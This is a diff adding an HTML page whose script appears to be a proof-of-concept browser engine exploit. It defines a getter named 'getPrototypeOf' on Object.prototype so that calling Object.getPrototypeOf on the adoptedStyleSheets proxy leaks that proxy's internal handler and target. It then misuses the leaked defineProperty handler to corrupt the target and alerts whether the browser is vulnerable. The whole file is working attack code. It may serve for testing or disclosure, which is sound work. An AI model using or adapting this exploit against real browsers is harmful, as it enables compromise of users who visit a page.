@@ -1,0 +1,32 @@
+<html>
+
+<body>
+    <script>
+        function CorruptObject(id, sentinel) {
+            let doc = document.implementation.createHTMLDocument(id);
+            let proxy = doc.adoptedStyleSheets;
+            let leaked_handler = null;
+            let leaked_target = null;
+            let target_leaker = (target) => { leaked_target = target; return null };
+            Object.prototype.__defineGetter__("getPrototypeOf", function () {
+                leaked_handler = this;
+                return target_leaker;
+            });
+            Object.getPrototypeOf(proxy);
+            try {
+                // store `sentinel` value directly to the object
+                Reflect.apply(leaked_handler.defineProperty, leaked_target, [leaked_target, sentinel, { 'value': 5, 'enumerable': true }]);
+            } catch (e) {
+                alert("failure. not vul");
+                return;
+            }
+            return leaked_target
+        }
+        var moving_key = [1, 2, 3];
+        moving_key.a = 5;
+        var object_1 = CorruptObject("a", moving_key);
+        alert(object_1);
+    </script>
+</body>
+
+</html>
